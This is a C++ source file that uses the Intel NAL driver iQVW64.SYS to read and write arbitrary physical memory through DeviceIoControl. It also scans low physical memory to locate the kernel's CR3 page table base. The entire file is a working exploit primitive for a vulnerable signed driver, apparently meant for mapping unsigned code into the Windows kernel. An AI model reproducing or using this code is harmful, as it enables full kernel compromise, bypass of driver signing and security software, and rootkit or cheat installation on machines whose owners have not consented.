// ioctl.cpp -- iQVW64.SYS (Intel NAL) physmem implementation.

#include "ioctl.h"

#include <algorithm>
#include <cstdio>
#include <cstring>
#include <vector>

namespace ioctl {

bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
    uint8_t* out = static_cast<uint8_t*>(dst);
    while (size) {
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));

        NalCopyInput req{};
        req.case_number = NAL_CASE_COPY;
        req.reserved = 0;
        req.source = phys;
        req.destination = reinterpret_cast<uint64_t>(out);
        req.length = chunk;

        DWORD returned = 0;
        if (!DeviceIoControl(device, IOCTL_NAL,
                             &req, sizeof(req), nullptr, 0,
                             &returned, nullptr)) {
            std::printf("[!] ioctl::read_physical failed (phys=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(phys), chunk, GetLastError());
            return false;
        }

        phys += chunk;
        out  += chunk;
        size -= chunk;
    }
    return true;
}

bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) {
    const uint8_t* in = static_cast<const uint8_t*>(src);
    while (size) {
        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));

        NalCopyInput req{};
        req.case_number = NAL_CASE_COPY;
        req.reserved = 0;
        req.source = reinterpret_cast<uint64_t>(in);
        req.destination = phys;
        req.length = chunk;

        DWORD returned = 0;
        if (!DeviceIoControl(device, IOCTL_NAL,
                             &req, sizeof(req), nullptr, 0,
                             &returned, nullptr)) {
            std::printf("[!] ioctl::write_physical failed (phys=%016llX size=%u err=%lu)\n",
                        static_cast<unsigned long long>(phys), chunk, GetLastError());
            return false;
        }

        phys += chunk;
        in   += chunk;
        size -= chunk;
    }
    return true;
}

bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
    std::vector<uint8_t> mem(0x100000);
    if (!read_physical(device, 0, mem.data(), 0x100000)) {
        std::printf("[!] ioctl::get_pml4_phys: read of low 1MB failed\n");
        return false;
    }

    cr3 = 0;
    for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem.data() + off);
        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 112);
        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 160);

        if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
            (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
            (val160 & 0xFFFFFF0000000FFFULL) == 0) {
            cr3 = val160;
            break;
        }
    }

    if (cr3 == 0) {
        std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
        return false;
    }
    return true;
}

} // namespace ioctl
